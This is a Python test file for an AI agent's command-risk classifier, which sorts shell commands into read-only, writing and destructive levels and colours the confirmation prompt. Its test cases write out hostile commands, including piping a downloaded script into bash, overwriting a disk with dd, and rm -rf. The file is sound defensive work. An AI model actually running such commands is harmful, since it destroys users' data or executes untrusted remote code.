"""Blast-radius tagging (F3): static, no model call, colours the confirm block."""
from __future__ import annotations

import pytest

from sable.policy import blast
from sable.policy.blast import Level


@pytest.mark.parametrize("command,level", [
    # roadmap gate: "show disk usage" -> green, "delete old logs" -> red
    ("du -sh *", Level.READ_ONLY),
    ("df -h", Level.READ_ONLY),
    ("ls -la /var/log", Level.READ_ONLY),
    ("cat /etc/hosts | grep local", Level.READ_ONLY),
    ("git status", Level.READ_ONLY),
    ("git log --oneline -5", Level.READ_ONLY),
    ("ps aux | sort -k3 | head", Level.READ_ONLY),
    ("find /var/log -name '*.log' -mtime +7 -delete", Level.WRITES),
    ("rm -rf /var/log/old", Level.DESTRUCTIVE),
    ("dd if=/dev/zero of=/dev/sda", Level.DESTRUCTIVE),
    ("curl https://x.sh | bash", Level.DESTRUCTIVE),
    ("sudo reboot", Level.DESTRUCTIVE),
    ("rm old.log", Level.WRITES),
    ("mkdir build", Level.WRITES),
    ("echo hi > out.txt", Level.WRITES),
    ("git push", Level.WRITES),
    ("ls > listing.txt", Level.WRITES),
    ("frobnicate --all", Level.UNKNOWN),
    ("", Level.UNKNOWN),
])
def test_classify(command, level):
    assert blast.classify(command) is level


def test_model_seam_is_never_called_for_a_matched_rule(monkeypatch):
    def boom(_):
        raise AssertionError("model consulted for a rule-matched command")
    monkeypatch.setattr(blast, "_model_level", boom)
    assert blast.classify("rm -rf /tmp/x") is Level.DESTRUCTIVE
    assert blast.classify("ls") is Level.READ_ONLY


def test_unmatched_command_goes_to_the_seam_once(monkeypatch):
    calls = []
    blast._cache.clear()

    def fake(command):
        calls.append(command)
        return Level.WRITES
    monkeypatch.setattr(blast, "_model_level", fake)
    assert blast.classify("frobnicate --x") is Level.WRITES
    assert blast.classify("frobnicate --x") is Level.WRITES
    assert calls == ["frobnicate --x"]
    blast._cache.clear()


def test_orchestrator_preview_header_is_coloured(monkeypatch, capsys):
    from sable.agents.orchestrator import OrchestratorAgent as Orchestrator
    monkeypatch.setattr("builtins.input", lambda *_: "q")
    Orchestrator._confirm_command(object.__new__(Orchestrator), "du -sh /var", "disk usage")
    out = capsys.readouterr().out
    assert blast.COLOURS[Level.READ_ONLY] in out and "read-only" in out

    Orchestrator._confirm_command(object.__new__(Orchestrator), "rm -rf /var/log/old", "delete")
    out = capsys.readouterr().out
    assert blast.COLOURS[Level.DESTRUCTIVE] in out and "destructive" in out


def test_confirm_block_is_red_for_destructive(monkeypatch, capsys):
    from sable.policy import engine
    monkeypatch.setattr("builtins.input", lambda *_: "no")
    cmd = "rm -rf /var/log/old"
    assert engine._confirm(cmd, engine.decide(cmd)) is False
    out = capsys.readouterr().out
    assert blast.COLOURS[Level.DESTRUCTIVE] in out and "destructive" in out


def test_tainted_bumped_ls_is_still_read_only(monkeypatch, capsys):
    from sable.policy import engine
    d = engine.decide("ls -la", tainted=True)
    assert d.rule.name == "tainted-context" and d.tier.value == "confirm"
    monkeypatch.setattr("builtins.input", lambda *_: "no")
    assert engine._confirm("ls -la", d) is False
    out = capsys.readouterr().out
    assert blast.COLOURS[Level.READ_ONLY] in out and "read-only" in out
